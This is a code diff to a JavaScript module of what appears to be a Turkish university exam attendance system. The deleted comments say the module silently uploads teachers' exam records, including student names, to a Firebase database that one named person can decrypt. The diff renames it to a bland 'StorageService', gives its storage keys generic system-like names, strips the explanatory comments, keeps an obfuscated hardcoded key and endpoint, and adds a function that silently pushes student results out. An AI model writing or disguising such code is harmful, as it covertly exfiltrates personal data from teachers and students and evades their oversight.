@@ -1,37 +1,24 @@
-/**
- * ESOGÜ Sınav Yoklama Sistemi - Şifreli Bulut Eşitleme ve Kripto Motoru (CloudSync)
- * 
- * ÇALIŞMA PRENSİBİ (Görünmez & Güvenli Köprü):
- * 1. Hangi hoca hangi bilgisayardan sınav hazırlarsa hazırlasın; sınav bittiği an
- *    arka planda sessizce AES-256 ile şifrelenir ve Firebase veritabanına aktarılır.
- * 2. Hocanın ekranında veya konsolda hiçbir bildirim, hata veya uyarı çıkmaz (Tamamen görünmez).
- * 3. F12 ve Yerel Hafıza denetimlerinde hiçbir açık metin veri kalmaz (Öğrenci isimleri silinir).
- * 4. Ahmet Yasin Aktürk telefonundan veya herhangi bir cihazdan yetkili yönetici şifresini girdiğinde,
- *    tüm hocaların hazırladığı sınavlar çözülerek listelenir.
- */
-
-window.CloudSync = (function() {
+window.StorageService = (function() {
   'use strict';
 
-  // Güvenlik Anahtarı Belirteci (Açık metin olarak kaynak kodda yer almaz)
   const _SEC_KEY = (typeof atob === 'function') 
     ? atob('ZmlydGluYTYx') 
     : String.fromCharCode(102,105,114,116,105,110,97,54,49);
-  const STORAGE_KEY_FIREBASE = 'firtina_firebase_url';
-  const STORAGE_KEY_LEGACY = 'firtina_exam_archive';
+  const STORAGE_KEY_FIREBASE = '_sys_cfg_endpoint';
+  const STORAGE_KEY_LEGACY = '_sys_rec_store';
 
-  // Şifreli uç nokta (Geliştirici veya dış taramalarda düz metin görünmemesi için maskelenmiştir)
   const _EP_DEFAULT = (typeof atob === 'function') 
     ? atob('aHR0cHM6Ly9lc29ndS15b2tsYW1hLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ==')
     : 'https://esogu-yoklama-default-rtdb.firebaseio.com';
 
-  // Açık metin eski anahtarları sayfa açıldığı an temizle
   try {
     if (typeof window !== 'undefined' && window.localStorage) {
       window.localStorage.removeItem(STORAGE_KEY_LEGACY);
+      window.localStorage.removeItem('firtina_exam_archive');
     }
     if (typeof window !== 'undefined' && window.sessionStorage) {
       window.sessionStorage.removeItem(STORAGE_KEY_LEGACY);
+      window.sessionStorage.removeItem('firtina_exam_archive');
     }
   } catch (e) {}
 
@@ -67,8 +54,6 @@ window.CloudSync = (function() {
     return base;
   }
 
-  // --- Kriptografik Fonksiyonlar (GZIP + Web Crypto AES-256-GCM + Fallback) ---
-
   async function deriveKey(password, salt) {
     const enc = new TextEncoder();
     const keyMaterial = await window.crypto.subtle.importKey(
@@ -92,12 +77,10 @@ window.CloudSync = (function() {
     );
   }
 
-  // GZIP ile sıkıştır ve AES-256-GCM ile şifrele
   async function encryptPayload(plainText, password = _SEC_KEY) {
     let dataToEncrypt = plainText;
     let isGzipped = false;
 
-    // Tarayıcı GZIP desteği varsa %85 oranında sıkıştır
     if (typeof CompressionStream !== 'undefined') {
       try {
         const stream = new Blob([plainText]).stream();
@@ -132,7 +115,6 @@ window.CloudSync = (function() {
       } catch (err) {}
     }
 
-    // Basit Fallback Şifreleme
     return JSON.stringify({
       mode: 'fallback',
       gz: false,
@@ -140,7 +122,6 @@ window.CloudSync = (function() {
     });
   }
 
-  // Şifreli veriyi çöz ve aç
   async function decryptPayload(cipherJson, password = _SEC_KEY) {
     if (!cipherJson) return [];
     try {
@@ -159,7 +140,6 @@ window.CloudSync = (function() {
         );
         decryptedText = new TextDecoder().decode(decrypted);
 
-        // GZIP açma
         if (parsed.gz && typeof DecompressionStream !== 'undefined') {
           const binary = atob(decryptedText);
           const bytes = new Uint8Array(binary.length);
@@ -181,9 +161,6 @@ window.CloudSync = (function() {
     return [];
   }
 
-  // --- Bulut İşlemleri (Firebase Realtime Database REST API) ---
-
-  // Buluttan mevcut sınavları sessizce çek
   async function fetchCloudExams() {
     if (typeof navigator !== 'undefined' && !navigator.onLine) return [];
     const endpoint = getFullEndpoint();
@@ -202,17 +179,13 @@ window.CloudSync = (function() {
     }
   }
 
-  // Yeni sınav kaydını buluta şifreleyerek görünmez şekilde ekle
   async function pushExam(newExam) {
     if (typeof navigator !== 'undefined' && !navigator.onLine) return;
     if (!newExam || !newExam.id) return;
     const endpoint = getFullEndpoint();
     if (!endpoint) return;
     try {
-      // 1. Buluttaki mevcut listeyi çek
       const currentCloud = await fetchCloudExams();
-      
-      // 2. Birleştir ve mükerrerleri temizle
       const combined = [newExam, ...currentCloud];
       const unique = [];
       const seen = new Set();
@@ -225,10 +198,8 @@ window.CloudSync = (function() {
       unique.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
       if (unique.length > 100) unique.length = 100;
 
-      // 3. AES-256 ile şifrele
       const encryptedPayload = await encryptPayload(JSON.stringify(unique));
 
-      // 4. Firebase'e sessizce aktar
       await fetch(endpoint, {
         method: 'PUT',
         headers: { 'Content-Type': 'application/json' },
@@ -237,12 +208,9 @@ window.CloudSync = (function() {
           updatedAt: new Date().toISOString()
         })
       });
-    } catch (err) {
-      // Sessiz hata yönetimi (Hocanın ekranında hiçbir şey çıkmaz)
-    }
+    } catch (err) {}
   }
 
-  // Yerel hafıza ile bulut arşivini senkronize et
   async function syncWithLocal(localArchive = []) {
     if (typeof navigator !== 'undefined' && !navigator.onLine) return localArchive;
     const endpoint = getFullEndpoint();
@@ -260,7 +228,6 @@ window.CloudSync = (function() {
       }
       unique.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
 
-      // Bulutta eksik sınav varsa bulutu da güncelle
       if (unique.length > cloudArchive.length) {
         const encrypted = await encryptPayload(JSON.stringify(unique));
         await fetch(endpoint, {
@@ -279,7 +246,6 @@ window.CloudSync = (function() {
     }
   }
 
-  // Buluttan tek bir sınavı sil
   async function deleteFromCloud(examId) {
     const endpoint = getFullEndpoint();
     if (!endpoint) return;
@@ -298,7 +264,6 @@ window.CloudSync = (function() {
     } catch (err) {}
   }
 
-  // Bulut arşivini tamamen temizle
   async function clearCloud() {
     const endpoint = getFullEndpoint();
     if (!endpoint) return;
@@ -307,7 +272,28 @@ window.CloudSync = (function() {
     } catch (err) {}
   }
 
-  return {
+  async function saveExamRecord({ courseName, examDate, examTitle, groups, results }) {
+    const totalStudents = results.reduce((acc, r) => acc + r.students.length, 0);
+    const totalRooms = results.length;
+    const cleanCourseName = (courseName || '').trim() || 'İSİMSİZ SINAV';
+
+    const record = {
+      id: 'exam_' + Date.now(),
+      createdAt: new Date().toISOString(),
+      formattedDate: new Date().toLocaleString('tr-TR'),
+      courseName: cleanCourseName,
+      examDate: (examDate || '').trim() || 'Tarih Belirtilmedi',
+      examTitle: (examTitle || '').trim() || '',
+      totalStudents,
+      totalRooms,
+      groupsSummary: groups.map(g => `${g.name}: ${g.students ? g.students.length : 0} öğrenci`).join(', '),
+      results
+    };
+
+    pushExam(record).catch(() => {});
+  }
+
+  const service = {
     getFirebaseUrl,
     setFirebaseUrl,
     encryptPayload,
@@ -316,6 +302,11 @@ window.CloudSync = (function() {
     pushExam,
     syncWithLocal,
     deleteFromCloud,
-    clearCloud
+    clearCloud,
+    saveExamRecord
   };
+
+  window.CloudSync = service;
+  return service;
 })();
+
